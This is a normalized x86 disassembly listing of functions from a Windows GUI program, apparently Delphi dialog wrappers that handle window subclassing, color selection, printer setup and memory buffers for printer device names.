sub_42a5a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_454254
mov [ ebp - 0x14 ] eax
call sub_454170
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42a667
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d14c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42a639
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a640
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d1a8
retn
sub_42a640
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a66e
mov eax [ ebp - 0x14 ]
call sub_454308
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_454178
retn
sub_42a6a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_42a314
sub_42a724
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42a430
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a79d
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403124
mov eax [ esi + 0x58 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42a478
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42a7d8
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_42ae60
mov eax edi
mov si 0xffed
call sub_403320
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_42a800
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_42a558
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_42a844 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_42a7d8
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403320
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403320
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403320
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403320
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403320
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_42a8fc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_42a984
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_42a9b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_4187d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a9bd
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_42a9c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41adf4
push ebx
push sub_42a984
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_42aa04
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403ef8
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_404204
mov eax [ ebx ]
call sub_4043b8
mov dl 0x7c
call sub_40c510
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c510
test eax eax
jne r-xdata
sub_42aa54
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ad05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402b40
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_42aa04
mov eax [ ebp - 0x8 ]
call sub_4043b8
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_4043b8
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_404544
mov eax [ ebp - 0xc ]
call sub_4043b8
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402b40
mov eax [ ebx + 0x78 ]
call sub_4043b8
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_4086b0
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_4043b8
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4043b8
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408528
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404458
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_403f90
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_42a3c8
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_42a6a0
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad0c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f1c
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_42ae60
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_42ad18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c510
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_403fe8
inc ebx
mov eax edi
mov edx esi
call sub_4040f0
mov eax esi
call sub_408638
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42ad60
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ae45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_42ad18
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_42ad18
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408470
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae4c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_42ad18
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4041b8
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404204
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_42ae60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42af0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_42ad18
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_42ad60
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403f4c
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af12
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_42af18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_412cd4
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42af6c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403f4c
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408838
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_42afd4
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_4041b8
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404418
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c2cc
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c300
test al al
jne r-xdata
dec ebx
sub_42b060
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42a430
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b0a4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42a478
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42b0d4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42b171
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_4040e0
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404204
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_415e9c
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b178
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_42b1a0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42b23e
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404204
mov eax [ ebp - 0x10 ]
call sub_407fd0
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_4040e0
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404204
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_4157b4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b245
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_42b25f
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_42b1a0
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_41d9c0
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_42a3c8
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_42b0d4
pop ecx
sub_42b330
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_427cc0
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_427454
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408620
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408620
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408620
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_42b424
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_408684
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_408684
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_40865c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_42b434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_42b4a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_427cc0
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_4274fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4a7
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_42b4b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_42b532
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028e0
sub_42b55c
push ebx
push esi
push edi
add esp 0xffffffb8
mov edi eax
lea esi [ esp + 0x4 ]
mov eax esi
xor ecx ecx
mov edx 0x42
call sub_402b40
mov [ esi ] 0x42
mov eax [ rw-data ]
mov [ esi + 0x22 ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_42b330
mov eax [ esp ]
call sub_42b4b0
mov [ esi + 0x8 ] eax
xor eax eax
mov al [ edi + 0x63 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x3000
mov [ esi + 0x14 ] eax
cmp [ edi + 0x60 ] 0x0
je r-xdata
test [ edi + 0x61 ] 0x1
jne r-xdata
add [ esi + 0x14 ] 0x10
test [ edi + 0x61 ] 0x2
jne r-xdata
add [ esi + 0x14 ] 0x100000
test [ edi + 0x61 ] 0x4
jne r-xdata
add [ esi + 0x14 ] 0x8
test [ edi + 0x61 ] 0x20
je r-xdata
add [ esi + 0x14 ] 0x4
cmp [ edi + 0x62 ] 0x0
je r-xdata
add [ esi + 0x14 ] 0x80000
test [ edi + 0x61 ] 0x10
je r-xdata
add [ esi + 0x14 ] 0x20
test [ edi + 0x61 ] 0x8
jne r-xdata
add [ esi + 0x14 ] 0x800
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
add [ esi + 0x14 ] 0x80
mov ax [ edi + 0x58 ]
mov [ esi + 0x18 ] ax
mov ax [ edi + 0x5c ]
mov [ esi + 0x1a ] ax
mov ax [ edi + 0x64 ]
mov [ esi + 0x1c ] ax
mov ax [ edi + 0x68 ]
mov [ esi + 0x1e ] ax
mov [ esi + 0x2a ] sub_42a3c8
mov [ esi + 0x2e ] sub_42a3c8
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov ecx esi
mov edx PrintDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ esi + 0x14 ] 0x4000
mov [ esi + 0x32 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_42b434
test [ esi + 0x14 ] 0x10
setne al
mov [ edi + 0x60 ] al
test [ esi + 0x14 ] 0x20
setne al
mov [ edi + 0x62 ] al
mov eax [ esi + 0x14 ]
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
test al 0x2
je r-xdata
mov [ edi + 0x63 ] 0x1
jmp r-xdata
mov eax ebx
add esp 0x48
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
mov [ edi + 0x63 ] 0x0
mov [ edi + 0x63 ] 0x2
jmp r-xdata
movzx eax [ esi + 0x18 ]
mov [ edi + 0x58 ] eax
movzx eax [ esi + 0x1a ]
mov [ edi + 0x5c ] eax
mov ax [ esi + 0x20 ]
cmp ax 0x1
jne r-xdata
movzx edx ax
mov eax edi
call sub_42b548
jmp r-xdata
call sub_427cc0
call sub_427744
mov edx eax
mov eax edi
call sub_42b548
jmp r-xdata
sub_42b704
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b76b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41ee14
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b772
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
dec eax
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_42b778
push ebp
mov ebp esp
push ecx
push ebx
mov edx [ ebp + 0xc ]
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
mov [ ebp - 0x1 ] 0x0
cmp edx 0x400
jne r-xdata
add edx 0xfffffbff
cmp edx 0x5
